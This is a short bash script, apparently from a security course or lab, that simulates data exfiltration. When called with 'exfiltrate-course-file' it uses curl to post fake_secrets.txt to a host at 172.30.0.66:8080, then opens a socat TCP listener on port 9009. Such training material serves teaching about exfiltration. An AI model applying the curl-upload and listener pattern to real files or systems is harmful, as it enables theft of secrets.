#!/usr/bin/env bash

set -euo pipefail

if [ "$#" -gt 1 ]; then
        echo "Usage: $0 [exfiltrate-course-file]" >&2
        exit 1
fi

if [ "$#" -eq 1 ] ; then 
	if [ "$1" != "exfiltrate-course-file" ]; then
		echo "Usage: $0 [exfiltrate-course-file]" >&2
        	exit 1
	fi
	curl -d @fake_secrets.txt http://172.30.0.66:8080/
fi
socat TCP-LISTEN:9009,reuseaddr,fork -
